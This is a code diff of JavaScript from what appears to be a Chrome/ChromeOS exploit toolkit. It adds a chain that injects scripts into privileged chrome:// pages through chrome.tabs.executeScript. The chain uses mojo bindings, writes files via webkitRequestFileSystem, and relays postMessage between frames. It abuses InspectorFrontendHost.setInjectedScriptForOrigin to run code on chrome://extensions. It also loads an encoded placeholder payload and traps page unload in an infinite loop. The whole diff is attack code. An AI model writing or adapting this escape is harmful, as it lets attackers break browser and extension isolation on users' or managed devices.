@@ -41,8 +41,8 @@
                             url: mojoURL
                         }, function (win) {
                             const r = win.tabs[0].id;
-                            chrome.tabs.executeScript(r, {code: `location.href = \"javascript:${atob('%%CHROMEPAYLOAD%%')}\"`});
-                            
+                            chrome.tabs.executeScript(r, { code: `location.href = \"javascript:${atob('%%CHROMEPAYLOAD%%')}\"` });
+
                         })
                     })
 
@@ -92,7 +92,7 @@
                     cleanup();
                 });
 
-                
+
                 // }, 5000);
 
             }
@@ -106,6 +106,67 @@
             }
             document.close();
             document.title = "Dashboard";
+            document.querySelector('#activate2').onclick = function (ev) {
+
+                function xd() {
+                    const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
+                    const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
+                    chrome.tabs.getCurrent(function (tab) {
+                        console.log(tab);
+                        chrome.windows.create({ url: mojoURL, setSelfAsOpener: true }, function (info) {
+                            async function createAndWriteFile() {
+                                function writeFile(filename, content) {
+                                    return new Promise((resolve) => {
+                                        webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function (fs) {
+                                            fs.root.getFile(filename, { create: true }, function (entry) {
+                                                entry.remove(function () {
+                                                    fs.root.getFile(filename, { create: true }, function (entry) {
+                                                        entry.createWriter(function (writer) {
+                                                            writer.write(new Blob([content]))
+                                                            writer.onwriteend = function () {
+                                                                resolve(entry.toURL());
+                                                            }
+                                                        })
+                                                    })
+                                                })
+                                            })
+                                        })
+                                    })
+
+                                }
+                                const htmlFile = `<html>
+                                <head></head><body><iframe src="chrome://extensions"></iframe>
+                                </html>
+                                
+                                `
+                                
+                                // alert(url);
+                                opener.postMessage({ url: URL.createObjectURL(new Blob([htmlFile], {type: "text/html"})) }, '*');
+                            }
+                            chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });
+                            function m2(url) {
+                                // alert(url);
+                                onmessage = function (data) {
+                                    if (data.data.type === "ack") {
+                                        // chrome.tabs.getCurrent(function (tab) {
+                                            alert("navigating");
+                                            chrome.tabs.update(tab.id, { url })
+                                        // })
+                                    }
+                                }
+                                top.postMessage({ type: 'acc' }, '*');
+                            }
+                            onmessage = function (dat) {
+                                if (dat.data.url) {
+                                    m2(dat.data.url);
+                                }
+                            };
+                        })
+                    })
+
+                }
+                dbgext(false, pdfId, xd.toString());
+            }
             document.querySelector('#updater').onclick = function (ev) {
                 onunload = null;
                 const ws = new WebSocket("ws://%%updaterurl%%");
@@ -129,6 +190,12 @@
 
             }
             onmessage = function (d) {
+                if (d.data.type === "acc") {
+                    onunload = function () { while (true); };
+                    d.source.postMessage({ type: "ack" }, '*');
+                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://extensions', 'alert(1)//');
+                };
+
                 if (!globalMap[d.data.uid]) return;
 
                 for (const frame of globalMap) {
